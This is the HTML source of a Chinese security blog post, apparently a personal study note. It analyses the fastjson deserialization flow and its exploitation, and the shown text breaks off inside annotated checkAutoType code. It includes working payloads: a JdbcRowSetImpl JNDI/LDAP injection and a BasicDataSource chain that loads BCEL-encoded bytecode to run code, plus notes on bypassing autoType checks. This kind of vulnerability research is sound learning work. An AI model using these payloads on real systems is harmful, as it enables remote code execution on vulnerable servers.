@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 8.1.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Inter:300,300italic,400,400italic,700,700italic|Noto Sans SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|JetBrains Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ctwabc.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#4A90D9","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="反序列化流程分析  fastjson1.2.24    获得一个默认的json解析器  在按json字符串去解析，匹配到了左大括号。  json字符串就是一个键值对，取&quot; &quot;之间的键，取完之后如果不是:就抛异常   遇到@type就得按对应的类去解析了。跟进到loadClass()  先从mappings这个缓存表中获取，缓存列没有就到下面的判断，这个两个if判断是为解决loa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson">
+<meta property="og:url" content="http://ctwabc.github.io/2026/06/23/fastjson/index.html">
+<meta property="og:site_name" content="ctwabc&#39;s Blog">
+<meta property="og:description" content="反序列化流程分析  fastjson1.2.24    获得一个默认的json解析器  在按json字符串去解析，匹配到了左大括号。  json字符串就是一个键值对，取&quot; &quot;之间的键，取完之后如果不是:就抛异常   遇到@type就得按对应的类去解析了。跟进到loadClass()  先从mappings这个缓存表中获取，缓存列没有就到下面的判断，这个两个if判断是为解决loa">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson2.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson1.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson3.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson4.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson5.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson6.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson7.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson8.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson9.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson10.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson11.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson12.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson13.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson15.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson16.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson17.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson18.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson19.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson20.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson21.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson23.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson22.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson24.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson25.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson26.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson27.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson28.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson29.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson30.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson37.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson38.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson39.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson31.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson32.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson33.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson34.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson35.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson36.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson40.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson41.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson42.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson43.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson9.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson44.png">
+<meta property="article:published_time" content="2026-06-23T14:42:06.000Z">
+<meta property="article:modified_time" content="2026-06-26T10:15:38.725Z">
+<meta property="article:author" content="ctwabc">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://ctwabc.github.io/2026/06/23/fastjson/fastjson2.png">
+
+<link rel="canonical" href="http://ctwabc.github.io/2026/06/23/fastjson/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+
+<style>
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    z-index: -2;
+    /* Fallback gradient when wallpaper API fails */
+    background: linear-gradient(135deg, #e8f0fe 0%, #f3e8ff 25%, #fce4ec 50%, #e8f5e9 75%, #e3f2fd 100%);
+    background-size: 400% 400%;
+    animation: gradientShift 20s ease infinite;
+  }
+
+  @keyframes gradientShift {
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+  }
+</style>
+
+
+<meta property="og:image" content="https://github.com/ctwabc.png">
+<meta name="twitter:card" content="summary">
+
+  <title>fastjson | ctwabc's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ctwabc's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">学习笔记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://ctwabc.github.io/2026/06/23/fastjson/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://github.com/ctwabc.png">
+      <meta itemprop="name" content="ctwabc">
+      <meta itemprop="description" content="学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ctwabc's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          fastjson<a href="https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name_posts/fastjson.md" class="post-edit-link" title="编辑" rel="noopener" target="_blank"><i class="fa fa-pencil-alt"></i></a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-06-23 22:42:06" itemprop="dateCreated datePublished" datetime="2026-06-23T22:42:06+08:00">2026-06-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-06-26 18:15:38" itemprop="dateModified" datetime="2026-06-26T18:15:38+08:00">2026-06-26</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>7.2k</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong><em>反序列化流程分析</em></strong></p>
+<blockquote>
+<p>fastjson1.2.24</p>
+</blockquote>
+<p><img src="/2026/06/23/fastjson/fastjson2.png"></p>
+<p><img src="/2026/06/23/fastjson/fastjson1.png"></p>
+<p>获得一个默认的json解析器</p>
+<p><img src="/2026/06/23/fastjson/fastjson3.png"></p>
+<p>在按json字符串去解析，匹配到了左大括号。</p>
+<p><img src="/2026/06/23/fastjson/fastjson4.png"></p>
+<p>json字符串就是一个键值对，取<code>&quot; &quot;</code>之间的键，取完之后如果不是<code>:</code>就抛异常</p>
+<p><img src="/2026/06/23/fastjson/fastjson5.png"></p>
+<p><img src="/2026/06/23/fastjson/fastjson6.png"></p>
+<p>遇到@type就得按对应的类去解析了。跟进到loadClass()</p>
+<p><img src="/2026/06/23/fastjson/fastjson7.png"></p>
+<p>先从mappings这个缓存表中获取，缓存列没有就到下面的判断，这个两个if判断是为解决loadClass()不能加载的格式，这些格式不做处理的话forName()才可以加载。可以看到是通过裁切字符串来处理的，不过我们这个类就不需要了。</p>
+<p><img src="/2026/06/23/fastjson/fastjson8.png"></p>
+<p>加载类，然后放到缓存表里，返回。</p>
+<p><img src="/2026/06/23/fastjson/fastjson9.png"></p>
+<p>获取这个类的反序列化器，跟进。</p>
+<p><img src="/2026/06/23/fastjson/fastjson10.png"></p>
+<p>这是ParserConfig的构造方法，可以看到这个ParserConfig有很多类的反序列化器，不过我们这个类是自己创的肯定不在这些反序列化器的列表了。</p>
+<p><img src="/2026/06/23/fastjson/fastjson11.png"></p>
+<p>确实没找到，跟进。</p>
+<p><img src="/2026/06/23/fastjson/fastjson12.png"></p>
+<p>还是在找，找肯定是找不到的，找到最后会到这里，如图</p>
+<p><img src="/2026/06/23/fastjson/fastjson13.png"></p>
+<p>因为找不到，所以创建一个反序列化器，他是当这个类是JavaBean来创建的，跟进。</p>
+<p><img src="/2026/06/23/fastjson/fastjson15.png"></p>
+<p>这个就是在收集这个类的信息，这三个循环会把这个类的所有方法遍历一遍，然后把符合条件的set方法、公开属性、get方法记录。我们一个一个看</p>
+<p><img src="/2026/06/23/fastjson/fastjson16.png"></p>
+<p><img src="/2026/06/23/fastjson/fastjson17.png"></p>
+<p>这个方法的长度要大于等于4，不能是static方法，返回值得是void，参数只有一个，还得以set开头。propetyName记录的是set后面的部分并且将其转成小写，在这个代码中就是age。field找的是这个类的成员变量中跟propertyName一样的。</p>
+<p><img src="/2026/06/23/fastjson/fastjson18.png"></p>
+<p>然后就是把获得的信息汇总以后封装成FieldInfo然后放到fieldList里面。在我们这个类中会有setName和setAge在这个循环中放进去。</p>
+<p>因为这个类没有pulic的成员变量所以不会进到这个循环。</p>
+<p>看一下第三个循环。</p>
+<p><img src="/2026/06/23/fastjson/fastjson19.png"></p>
+<p>找get方法，方法名大于等于4，不能是静态方法，得以get开头，不能有参数，返回值类型得是if判断里面的这些类。</p>
+<p><img src="/2026/06/23/fastjson/fastjson20.png"></p>
+<p>他会根据properyName去查重，所以说如果有setMap的话就不能放getMap了。</p>
+<p>这次进到FieldInfo看一下。</p>
+<p><img src="/2026/06/23/fastjson/fastjson21.png"></p>
+<p>其他的都不太重要主要是这一部分，这里有一个getOnly的变量，我们希望他是true理由的话后面再写。这个方法得是参数不为一的方法，但我们知道set方法的参数是一不可能满足，只能寄希望于get方法，所以我这个Person类专门整了一个Map成员变量且只有get方法。这样就能把getOnly改成true了。</p>
+<p><img src="/2026/06/23/fastjson/fastjson23.png"></p>
+<p>方法的最后new出JavaBeanInfo对象，这个方法就结束了。</p>
+<p><img src="/2026/06/23/fastjson/fastjson22.png"></p>
+<p>会到这个方法，到这个部分。如果getOnly是false的话这里的asmEnable就是true，这样的话会走到asmFactory.createJavaBeanDeserializer()，这有什么问题呢？问题就是不能调试了，很烦。为了解决这个问题才有了getOnly改成true这一部分。我们看一下getOnly是怎么发挥作用的。</p>
+<p><img src="/2026/06/23/fastjson/fastjson24.png"></p>
+<p>遍历fieldInfo，有filedInfo的getOnly时true的的话，把asmEnable关掉。</p>
+<p><img src="/2026/06/23/fastjson/fastjson25.png"></p>
+<p>开始正式的反序列化了，其实就是赋值。通过循环从filedInfo里一个个的拿，这里我门拿到的是age，然后从json字符串那age对应的值，然后检查匹不匹配。这个if else非常多，就是为了匹配各种数据。</p>
+<p><img src="/2026/06/23/fastjson/fastjson26.png"></p>
+<p>然后到这里，在创建Person实例，我们跟进去看一下。</p>
+<p><img src="/2026/06/23/fastjson/fastjson27.png"></p>
+<p>从beanInfo里面把构造函数拿过来，然后newInstance。</p>
+<p><img src="/2026/06/23/fastjson/fastjson28.png"></p>
+<p>到这里就是要赋值了，跟进去。</p>
+<p><img src="/2026/06/23/fastjson/fastjson29.png"></p>
+<p>还是一样从fieldInfo拿到方法。</p>
+<p><img src="/2026/06/23/fastjson/fastjson30.png"></p>
+<p>反射调用赋值。</p>
+<p>循环结束了就拿到反序列化以后的对象了。<br>简单看一下序列化的过程<img src="/2026/06/23/fastjson/fastjson37.png"></p>
+<p><img src="/2026/06/23/fastjson/fastjson38.png"></p>
+<p><img src="/2026/06/23/fastjson/fastjson39.png"></p>
+<p>扫描这个类的所有public方法，进行筛选总结如下:</p>
+<p>get方法:</p>
+<ul>
+<li>不能是static方法</li>
+<li>返回值不能是void，ClassLoader，</li>
+<li>参数数量得是0</li>
+<li>方法名得以get开头</li>
+<li>方法名长度要大于等于4</li>
+<li>不能是getClass()，getDeclaringClass，getMetaClass</li>
+</ul>
+<p>is方法:</p>
+<ul>
+<li>不能是static方法</li>
+<li>返回值类型的事bool</li>
+<li>参数数量得是0</li>
+<li>方法名得以is开头</li>
+<li>方法名长度要大于等于3</li>
+<li>不能是getMetaClass</li>
+</ul>
+<p>扫描这个类的所有public方法，方法不能是static，返回值不能是void，参数数量得是0，返回值不能是ClassLoader，不能是getMetaClass，方法得以get开头，方法长度要大于等于4，不能是getClass方法，不能是getDeclaringClass方法，和反序列化一样有propertyName。is开头的也可以，is开头时方法名要大于等于3，返回类型得是bool。序列化时会把这些方法都调用一遍。</p>
+<p><strong><em>总结</em></strong></p>
+<p>有@type的时候，反序列化时会调用按指定对象的符合条件的set、get方法提供了要赋值的值的方法。</p>
+<p>主要关注了类的方法。例如，就算没有name这个成员变量，只要有setName，且json字符串写了name对应的值，就可以调用。</p>
+<p><strong><em>漏洞利用</em></strong></p>
+<blockquote>
+<p>&lt;&#x3D;fastjson1.2.24</p>
+</blockquote>
+<p><img src="/2026/06/23/fastjson/fastjson31.png"></p>
+<p>不太清楚怎么找到的。可以看到有JNDI注入，DataSourceName可以控制，有setDataSourceName方法，找一下调用connect的方法。总共就三个很好整。</p>
+<p><img src="/2026/06/23/fastjson/fastjson32.png"></p>
+<p>结束了，很简单。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://localhost:10389/cn=test,dc=example,dc=com\&quot;,\&quot;autoCommit\&quot;:\&quot;false\&quot;&#125;&quot;</span>;</span><br><span class="line">JSON.parseObject(s);</span><br></pre></td></tr></table></figure>
+
+<p>需要出网，下面这个不需要出网。</p>
+<p><img src="/2026/06/23/fastjson/fastjson33.png"></p>
+<p>这个ClassLoader在这里com.sun.org.apache.bcel.internal.util。bcel可以把$$BCEL$$这个后面部分接<code>.class</code> 字节码文件，通过特殊的编码方式（类似 Base64 变体）<strong>压缩并编码成一个纯文本字符串</strong>的字符串。然后把这个部分加载出来。关键还是这个ClassLoader只要ClassLoader是支持BCEL就好了。</p>
+<p><img src="/2026/06/23/fastjson/fastjson34.png"></p>
+<p>这个是tomcat的部分，在tomcat-dbcp。他这里有forName而且是初始化的，其中driverClassName和driverClassLoader都是可以控制的。然后就是找这个类的那一个get或set方法会调到这里。</p>
+<p><img src="/2026/06/23/fastjson/fastjson35.png"></p>
+<p>就是这个方法get方法，他会调用createDataSource()</p>
+<p><img src="/2026/06/23/fastjson/fastjson36.png"></p>
+<p>这个createDataSource又会调用createConnectionFactory()，这样就结束了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytes = convert(<span class="string">&quot;/Users/ctwabc/JavaClasses/Test.class&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(bytes, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span> +code +<span class="string">&quot;\&quot;,\&quot;driverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">JSONObject.parseObject(s);</span><br></pre></td></tr></table></figure>
+
+<p>因为会调用到getConnection所以需要序列化。</p>
+<blockquote>
+<p>&lt;&#x3D;fastjson1.2.47通杀</p>
+<p>下面的代码都是1.2.25版本的，了解一下增加了什么东西，以及绕过</p>
+</blockquote>
+<p><img src="/2026/06/23/fastjson/fastjson40.png"></p>
+<p>这个部分多了个checkAutoType(),我们看一下。</p>
+<p>默认情况下<code>autoTypeSupport</code>是<code>false</code>，<code>expectClass</code>是<code>null</code></p>
+<p>我就写成注释了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">		<span class="comment">// 如果autoTypeSupport开启了的话，进行白名单+黑名单的检测</span></span><br><span class="line">  	<span class="comment">// 白名单从配置读取，黑名单的话各版本之间都有不同，我们考虑的是默认情况不会进入到这个if里面</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="comment">// 从mappings缓存中读取，我们的绕过利用的就是这个</span></span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">// 这个应该也算是从缓存读取</span></span><br><span class="line">        clazz = deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="comment">// 从缓存中读取到的话进行简单的判断，然后返回</span></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">      	<span class="comment">// 因为期望类是空的不用太担心</span></span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">  	<span class="comment">// 绕过的方法是不会走到下面的，大概了解一下</span></span><br><span class="line">		<span class="comment">// 黑名单+白名单的检测</span></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="comment">//默认情况下两个都是false，进不去</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">				<span class="comment">// 加载的类不能是classloader,datasource</span></span><br><span class="line">        <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">                || DataSource.class.isAssignableFrom(clazz) 